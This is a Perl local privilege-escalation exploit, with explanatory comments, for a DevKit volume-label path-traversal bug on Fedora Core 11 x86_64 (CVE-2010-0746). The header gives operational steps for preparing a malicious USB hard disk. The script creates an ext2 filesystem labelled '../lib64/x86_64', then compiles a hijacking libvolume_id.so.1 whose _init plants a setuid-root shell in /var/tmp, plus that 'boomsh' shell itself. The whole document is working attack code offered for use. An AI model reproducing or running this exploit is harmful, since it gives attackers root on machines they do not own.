#!/usr/bin/perl
#
# ... Disarm. ... Smashing pumpkins disarming your machine.
#
# devshit FC11 x86_64 DevKit local root exploit. DevKit accepts
# label of pluggable HDD's more or less w/o restrictions (unlike udev)
# like it could contain "../foo". Then it uses /media as base component
# and concats $label so it results in /media/../foo. This directory
# is created and the HDD then mounted to it. We can exploit it, although
# it challenged me a bit first (then got some help from a friend discussing
# exploitation vectors;you rock). Problem is, that 1) the label can have
# at most 16 characters, and 2) the target dir must not exist. I tried
# various /etc/rc.d/ and /etc/procmailrcs tricks but at the end
# it all sucked and it would not have been a default root w/o
# root-interaction. At the end, stracing showed that /lib64/x86_64
# and /lib64/tls/x86_64 were searched by rtld but did not exist. The
# later would exceed 16 chars.
#
# For exploitation, get a portable
# HDD and a USB-stick. *** Be aware that the contents of the HDD will be
# destroyed ***. Setup the HDD at home like:
#
#    Device Boot      Start         End      Blocks   Id  System
# /dev/sdb1               1         132     1060258+  83  Linux
# /dev/sdb2             133         264     1060290   83  Linux
# /dev/sdb3             265         396     1060290   83  Linux
# /dev/sdb4             397         523     1020127+  83  Linux
#
# So you have some partitions on it. Run devshit for each partition
# like devshit /dev/sdb1 etc. Multiple parts are not really required
# but sometimes if you have multiple parts you dont need an additional
# USB strick since the mounted /lib64/x86_64/libvolume.so.1 is already
# used for /dev/sdb4 for example. Its racy, so as a fallback you'd need
# a stick. devshit will basically create a boomsh and a evil lib on the
# HDD and set the label to "../lib64/x86_64". After the evil HDD has
# been setup, the iDefense employee has to walk to the test-machine
# and login as the local user just like you would work on a machine
# at university or library where you do not have root. Then he must
# plugin the evil HDD and wait a bit. Then when /lib64/x86_64 appears,
# a rootshell might be already waiting in /var/tmp. If not, the USB
# stick needs to be plugged in as well to force execution of vol_id again
# which then uses the evil lib, creating a /var/tmp/boomsh.
# The employee must then mark this exploit as 'working' and 'cool',
# fill out the exploit-DB submit-form and add apropriate entries
# to the exploitation flow-chart at the wall. :)
#
# This bug is (C) 2009 but eventually got CVE-2010-0746.
#

sub usage
{
	print "Usage: $0 </dev/HDD-to-make-evil>\n";
	exit;
}

my $hdd = shift or usage();
system("mkfs.ext2 -L ../lib64/x86_64/ $hdd");
system("mkdir /M ||true;mount $hdd /M");
open(O,">/tmp/boomlib.c") or die $!;
print O<<EOF;
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>

int volume_id_log_fn = 0;
void volume_id_get_type_version() { volume_id_log_fn = 1; exit(0); }
void volume_id_get_usage() { volume_id_get_type_version(); }
void volume_id_get_label_raw() { volume_id_get_usage(); }
void volume_id_get_label() { volume_id_get_label_raw(); }
void volume_id_all_probers() { volume_id_get_label(); }
void volume_id_encode_string() { volume_id_all_probers(); }
void volume_id_close() { volume_id_encode_string(); }
void volume_id_probe_filesystem() { volume_id_close(); }
void volume_id_probe_raid() { volume_id_probe_filesystem(); }
void volume_id_get_uuid_sub() { volume_id_probe_raid(); }
void volume_id_open_fd() { volume_id_get_uuid_sub(); }
void volume_id_get_type() { volume_id_open_fd(); }
void volume_id_get_uuid() { volume_id_get_type(); }
void volume_id_get_prober_by_type() { volume_id_get_uuid(); }
void volume_id_probe_all() { volume_id_get_prober_by_type(); }

void _init()
{
	int fd1, fd2, r;
	char buf[32000];
	fd1 = open("/lib64/x86_64/boomsh", O_RDONLY);
	fd2 = open("/var/tmp/boomsh", O_RDWR|O_CREAT, 0600);
	if (fd1 < 0 || fd2 < 0)
		return;
	r = read(fd1, buf, sizeof(buf));
	write(fd2, buf, r);
	close(fd1); close(fd2);

	chown("/var/tmp/boomsh",0,0);chmod("/var/tmp/boomsh", 04755);
	volume_id_probe_all();
}
EOF
close(O);
system("cc -c -fPIC /tmp/boomlib.c -o /tmp/boomlib.o");
system("ld -shared -soname=libvolume_id.so.1 /tmp/boomlib.o -o /M/libvolume_id.so.1");
unlink("/tmp/boomlib.c"); unlink("/tmp/boomlib.o");
open(O,">/tmp/boomsh.c") or die $!;
print O<<EOF;
#include <stdio.h>
int main()
{
	char *a[]={"/bin/bash", "--noprofile", "--norc", NULL};
	setuid(0); setgid(0);
	execve(*a, a, NULL);
	return -1;
}
EOF
close(O);
system("gcc -s -O2 /tmp/boomsh.c -o /M/boomsh");
unlink("/tmp/boomsh.c");
system("umount /M");


